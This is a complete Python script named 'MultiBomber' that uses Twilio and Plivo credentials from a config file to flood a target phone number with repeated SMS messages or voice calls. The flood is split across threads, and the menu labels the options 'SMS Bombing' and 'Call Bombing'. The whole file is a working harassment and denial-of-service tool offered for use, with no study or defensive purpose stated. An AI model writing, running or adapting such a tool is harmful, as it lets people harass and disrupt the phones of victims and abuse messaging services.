import json
import time
import threading
import requests
from twilio.rest import Client
from plivo import RestClient

class MultiBomber:
    def __init__(self, config_path='apis.json'):
        with open(config_path, 'r') as f:
            self.config = json.load(f)
        self.sms_providers = self.config.get('sms_providers', [])
        self.call_providers = self.config.get('call_providers', [])

    def send_sms_twilio(self, provider, target, count, delay):
        client = Client(provider['sid'], provider['token'])
        for i in range(count):
            try:
                message = client.messages.create(
                    body="Automated Alert Notification",
                    from_=provider['from'],
                    to=target
                )
                print(f"[+] SMS {i+1} sent via Twilio (SID: {message.sid})")
                time.sleep(delay)
            except Exception as e:
                print(f"[-] Twilio SMS Error: {e}")

    def send_sms_plivo(self, provider, target, count, delay):
        client = RestClient(provider['auth_id'], provider['auth_token'])
        for i in range(count):
            try:
                response = client.messages.create(
                    src=provider['from'],
                    dst=target,
                    text='Automated Alert Notification'
                )
                print(f"[+] SMS {i+1} sent via Plivo")
                time.sleep(delay)
            except Exception as e:
                print(f"[-] Plivo SMS Error: {e}")

    def make_call_twilio(self, provider, target, count, delay):
        client = Client(provider['sid'], provider['token'])
        for i in range(count):
            try:
                call = client.calls.create(
                    url='http://demo.twilio.com/docs/voice.xml',
                    from_=provider['from'],
                    to=target
                )
                print(f"[+] Call {i+1} initiated via Twilio (SID: {call.sid})")
                time.sleep(delay)
            except Exception as e:
                print(f"[-] Twilio Call Error: {e}")

    def run(self):
        print("--- Automated SMS/Call Utility ---")
        print("1. SMS Bombing")
        print("2. Call Bombing")
        choice = input("Select option: ")
        
        target = input("Enter target number (with country code, e.g., +1234567890): ")
        amount = int(input("Enter total amount to send: "))
        delay = float(input("Enter delay between requests (seconds): "))

        threads = []
        
        if choice == '1':
            # Split the workload across available SMS providers
            per_provider = amount // len(self.sms_providers)
            for provider in self.sms_providers:
                if provider['name'] == 'Twilio':
                    t = threading.Thread(target=self.send_sms_twilio, args=(provider, target, per_provider, delay))
                elif provider['name'] == 'Plivo':
                    t = threading.Thread(target=self.send_sms_plivo, args=(provider, target, per_provider, delay))
                threads.append(t)
                t.start()

        elif choice == '2':
            per_provider = amount // len(self.call_providers)
            for provider in self.call_providers:
                if provider['name'] == 'Twilio':
                    t = threading.Thread(target=self.make_call_twilio, args=(provider, target, per_provider, delay))
                threads.append(t)
                t.start()

        for t in threads:
            t.join()
        print("\n[!] Task Completed.")

if __name__ == "__main__":
    bomber = MultiBomber()
    bomber.run()
